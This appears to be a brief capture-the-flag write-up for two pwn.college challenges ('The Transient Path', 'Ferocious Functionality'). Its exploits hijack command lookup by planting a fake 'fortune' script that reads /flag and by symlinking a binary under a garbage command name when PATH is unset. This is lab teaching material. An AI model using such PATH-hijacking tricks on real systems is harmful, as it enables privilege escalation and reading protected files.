# The Transient Path

### chall

```sh
#!/opt/pwn.college/sh

fortune
```

### exploit
```
create shell script named 'fortune' in /home/hacker with content "cat /flag"
```

# Ferocious Functionality

### chall

```sh
#!/opt/pwn.college/bash

unset PATH
did you think you could hack this? It doesnt even exist!
```

### exploit
```sh
ln -s fortune did
```

last location where bash looks at for binary is current working directory